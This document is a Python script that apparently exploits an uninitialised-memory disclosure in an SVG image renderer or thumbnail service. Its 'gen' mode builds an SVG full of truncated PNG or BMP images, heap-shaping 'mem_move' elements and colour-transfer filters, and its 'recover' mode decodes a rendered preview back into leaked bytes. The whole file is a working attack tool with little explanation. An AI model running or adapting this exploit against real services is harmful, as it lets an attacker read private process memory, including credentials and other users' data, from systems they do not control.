#!/usr/bin/env python3
import argparse
import subprocess
import zlib
import struct
import base64
import random
import string
import os
import sys
from xml.etree import ElementTree
from enum import Enum


def p32be(value):
    return struct.pack('>I', value)


def p32le(value):
    return struct.pack('<I', value)


def p16le(value):
    return struct.pack('<H', value)


def get_calibrating_pattern(width, height):
    total_len = width * height * 3
    base = f'This is {width}x{height} test data (total data size is {total_len} bytes).\n'.encode()
    if total_len > 256 + len(base):
        base += bytes(i for i in range(256))
    pixel_data = (base * (total_len // len(base) + 1))[:total_len]
    return pixel_data


def gen_random_color(width, height):
    pixel = bytes(random.randint(0, 255) for _ in range(3))
    return pixel * (width * height)


def make_png_chunk(chunk):
    return p32be(len(chunk) - 4) + chunk + p32be(zlib.crc32(chunk))


def get_transfer_tables():
    tables = []
    div = 1
    for filter_id in range(6):
        table = [0.0] * 256
        var = 2 if filter_id == 0 else 3
        for i in range(len(table)):
            table[i] = ((i // div) % var) / (var - 1)
        tables.append(table)
        div *= var

    return tables


class CalibrationMode(Enum):
    NONE = 0
    RANDOM = 1
    CALIBRATING = 2


def gen_png(width, height, calibrate_mode):
    png = bytearray()
    png.extend(b'\x89PNG\r\n\x1a\n')

    ihdr = b'IHDR' + p32be(width) + p32be(height) + b'\x08\x02\x00\x00\x00'
    png.extend(make_png_chunk(ihdr))
    if calibrate_mode == CalibrationMode.NONE:
        png.extend(b'\x00\x00\x00\x00' + b'IDAT')
        return bytes(png)

    if calibrate_mode == CalibrationMode.RANDOM:
        pixel_data = gen_random_color(width, height)
    elif calibrate_mode == CalibrationMode.CALIBRATING:
        pixel_data = get_calibrating_pattern(width, height)
    else:
        raise ValueError(f'Unknown calibration mode: {calibrate_mode}')

    scanline_len = width * 3
    total_len = height * scanline_len

    filtered_data = bytearray()
    for p in range(0, total_len, scanline_len):
        filtered_data.append(0)
        filtered_data.extend(pixel_data[p:p + scanline_len])

    compressed_data = zlib.compress(filtered_data)
    idat = b'IDAT' + compressed_data
    png.extend(make_png_chunk(idat))
    png.extend(make_png_chunk(b'IEND'))
    return bytes(png)


def gen_calibrating_bmp(width, height, calibrate_mode):
    if calibrate_mode == CalibrationMode.RANDOM:
        pattern = gen_random_color(width, height)
    elif calibrate_mode == CalibrationMode.CALIBRATING:
        pattern = get_calibrating_pattern(width, height)
    else:
        raise ValueError(f'Unknown calibration mode: {calibrate_mode}')

    bmp_data = b''
    for i in range(height - 1, -1, -1):
        line = bytearray(pattern[i * width * 3: (i + 1) * width * 3])
        for j in range(0, len(line), 3):
            line[j:j + 3] = line[j:j + 3][::-1]
        line += b'\x00' * ((-len(line)) % 4)
        bmp_data += line
    bmp = bytearray(b'\x00' * (14 + 12)) + bmp_data
    bmp[0:2] = b'BM'

    hdr = p32le(12) + p16le(width) + p16le(height) + p16le(1) + p16le(24)
    assert len(hdr) == 12
    bmp[14:14 + len(hdr)] = hdr
    bmp[2:14] = p32le(len(bmp)) + p32le(0) + p32le(14 + 12)

    return bmp


def gen_bmp(width, height, calibrate_mode):
    if calibrate_mode != CalibrationMode.NONE:
        return gen_calibrating_bmp(width, height, calibrate_mode)
    bmp = bytearray(b'\x00' * (14 + 40))
    bmp[0:2] = b'BM'
    hdr = p32le(40) + p32le(width) + p32le(height) + p16le(0) + p16le(16) + p32le(3)
    bmp[14:14 + len(hdr)] = hdr
    return bmp


FORMATS = {
    'bmp': ('image/bmp', gen_bmp),
    'png': ('image/png', gen_png),
}


def get_pic_dimensions(current_width, current_height, full_width, full_height):
    h = max(1, current_height // 2)
    return current_width, h


def gen_svg(width, height, calibrate_mode, image_format):
    content_type, generator = FORMATS[image_format]
    transfer_tables = get_transfer_tables()

    images = []  # tuples (x, y, width, height, data)
    leak_height = height // len(transfer_tables)

    left_width, left_height = width, leak_height
    while left_width > 0 and left_height > 0:
        image_width, image_height = get_pic_dimensions(left_width, left_height, width, leak_height)
        image_width = min(image_width, left_width)
        image_height = min(image_height, left_height)
        y = left_height - image_height
        x = left_width - image_width
        while x >= 0:
            pic = generator(image_width, image_height, calibrate_mode)
            encoded = base64.b64encode(pic).decode()
            images.append((x, y, image_width, image_height, encoded))
            x -= image_width

        left_width = x + image_width
        if y > 0:
            if left_width > 0:
                pic = generator(left_width, image_height, calibrate_mode)
                encoded = base64.b64encode(pic).decode()
                images.append((0, y, left_width, image_height, encoded))
            left_width = width
            left_height = y

    # images = images[::-1]

    root = ElementTree.Element('svg', width=f"{width}px", height=f"{height}px")
    defs = ElementTree.SubElement(root, 'defs')

    seen_size = set()
    for id, (_, _, w, h, encoded) in enumerate(images):
        if (w, h) in seen_size:
            ElementTree.SubElement(defs, f"feFuncR",
                                   tableValues=' 0' * (w * h * 3 // 4), id=f"mem_move_{id}")
        else:
            seen_size.add((w, h))

        ElementTree.SubElement(defs, 'image',
                               id=f"image_{id}",
                               width=f"{w}", height=f"{h}",
                               path=f'data:{content_type};base64,{encoded}')
    container = root
    for filter_id, table in enumerate(transfer_tables):
        filter = ElementTree.SubElement(defs, 'filter', id=f"filter_{filter_id}")
        transfer = ElementTree.SubElement(filter, 'feComponentTransfer')

        for channel in ('R', 'G', 'B'):
            ElementTree.SubElement(transfer, f"feFunc{channel}", type='table',
                                   tableValues=' '.join(str(v) for v in table))

        height_shift = leak_height * filter_id
        for id, (x, y, w, h, _) in enumerate(images):
            ElementTree.SubElement(container, 'use',
                                   x=f"{x}px", y=f"{y + height_shift}px",
                                   width=f"{w}px", height=f"{h}px",
                                   path=f'#image_{id}',
                                   filter=f'url(#filter_{filter_id})')

    comment = ''.join(random.choice(string.ascii_letters) for _ in range(50))
    root.append(ElementTree.Comment(f'Random comment for bypassing possible cache: {comment}'))
    serialized = ElementTree.tostring(root, encoding='utf-8', xml_declaration=True)
    serialized = serialized.replace(b'path=', b'xlink:href=')
    serialized = serialized.replace(b'>', b'>\n')
    serialized = serialized.replace(b"<?xml version='1.0' encoding='utf-8'?>",
                                    b'<?xml version="1.0" encoding="UTF-8" standalone="no" ?>')
    serialized = serialized.replace(b'\n\n',
                                    b'\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
                                    b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n')
    serialized = serialized.replace(b'<svg ', b'<svg xmlns="http://www.w3.org/2000/svg" '
                                              b'xmlns:xlink="http://www.w3.org/1999/xlink" ')
    return serialized


def get_pixel_data(filename):
    if filename is None:
        image_file = os.fdopen(sys.stdin.fileno(), 'rb', closefd=False)
    else:
        image_file = open(filename, 'rb')

    with image_file:
        data = image_file.read()

    try:
        converted = subprocess.check_output(['convert', '-', 'rgb:-'], input=data)
    except FileNotFoundError:
        raise RuntimeError('The "convert" utility not found. It is used in this program to recover the pixel data of '
                           'the previews. Please install ImageMagick')
    return converted


def recover_leakage(pixel_data, geometry):
    width, height = geometry
    if len(pixel_data) != width * height * 3:
        raise ValueError(f'Expected {width} X {height} X 3 = {width * height * 3} bytes of data, got {len(pixel_data)}')

    tables = get_transfer_tables()

    leak_height = height // len(tables)
    leak_size = width * leak_height * 3
    vals_by_filter = []

    for id in range(len(tables)):
        vals_by_filter.append(pixel_data[id * leak_size:(id + 1) * leak_size])

    trie = {}
    for b in range(256):
        vals = [t[b] for t in tables]
        node = trie
        for idx, k in enumerate(vals):
            next = b if idx == len(vals) - 1 else {}
            node = node.setdefault(k, next)

    data = bytearray(leak_size)
    for i in range(leak_size):
        cur_vals = [v[i] / 255 for v in vals_by_filter]
        node = trie
        for k in cur_vals:
            assert isinstance(node, dict)
            kk = min(node.keys(), key=lambda x: abs(x - k))
            node = node[kk]
        assert isinstance(node, int)
        data[i] = node

    sys.stdout.flush()
    return data


def handle_gen(args):
    width, height = args.geometry
    if args.calibrate and args.random_color:
        raise ValueError('Cannot use both --calibrate and --random-color')

    if args.calibrate:
        mode = CalibrationMode.CALIBRATING
    elif args.random_color:
        mode = CalibrationMode.RANDOM
    else:
        mode = CalibrationMode.NONE

    svg = gen_svg(width, height, mode, args.format)

    with open(args.output, 'wb') as f:
        f.write(svg)


def handle_recover(args):
    filename = args.filename
    if filename == '-':
        filename = None
    pixel_data = get_pixel_data(filename)
    data = recover_leakage(pixel_data, args.geometry)

    if args.output == '-':
        output = os.fdopen(sys.stdout.fileno(), 'wb', closefd=False)
    else:
        output = open(args.output, 'wb')

    with output:
        output.write(data)
        output.flush()


def geometry(geometry_str):
    w, h = map(int, geometry_str.split('x'))
    assert w > 0 and h > 0
    return w, h


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest='subcommand')
    subparsers.required = True

    parser_gen = subparsers.add_parser('gen')
    parser_gen.add_argument('geometry', type=geometry, help='geometry (WxH)')
    parser_gen.add_argument('--calibrate', action='store_true')
    parser_gen.add_argument('--random-color', action='store_true')
    parser_gen.add_argument('--format', choices=list(FORMATS.keys()), required=True)
    parser_gen.add_argument('output', help='output file')
    parser_gen.set_defaults(handler=handle_gen)

    parser_recover = subparsers.add_parser('recover')
    parser_recover.add_argument('geometry', type=geometry, help='geometry (WxH)')
    parser_recover.add_argument('filename', type=str)
    parser_recover.add_argument('--output', help='out in file instead of stdin', default='-')
    parser_recover.set_defaults(handler=handle_recover)

    parsed = parser.parse_args()
    parsed.handler(parsed)
